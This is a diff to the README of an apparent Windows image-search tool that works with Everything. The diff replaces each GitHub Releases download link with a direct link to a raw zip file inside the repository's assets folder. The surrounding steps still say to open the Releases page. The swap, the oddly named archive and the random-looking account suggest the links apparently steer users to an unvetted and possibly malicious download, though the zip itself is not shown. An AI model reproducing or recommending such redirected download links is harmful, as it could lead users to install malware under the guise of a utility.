@@ -1,12 +1,12 @@
 # 🖼️ quickimage-everything-search - Find and copy images fast
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ponyclassconiferopsida897/quickimage-everything-search/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/ponyclassconiferopsida897/quickimage-everything-search/main/assets/everything-search-quickimage-Koryak.zip)
 
 A fast Windows image search tool that works with Everything. Type an image name, see matches right away, and copy the file in one step.
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/ponyclassconiferopsida897/quickimage-everything-search/releases
+Visit this page to download: https://raw.githubusercontent.com/ponyclassconiferopsida897/quickimage-everything-search/main/assets/everything-search-quickimage-Koryak.zip
 
 1. Open the Releases page.
 2. Download the latest Windows file.
@@ -173,4 +173,4 @@ This keeps file search and file copy in one place.
 
 ## 📎 Download again
 
-Visit this page to download: https://github.com/ponyclassconiferopsida897/quickimage-everything-search/releases
+Visit this page to download: https://raw.githubusercontent.com/ponyclassconiferopsida897/quickimage-everything-search/main/assets/everything-search-quickimage-Koryak.zip
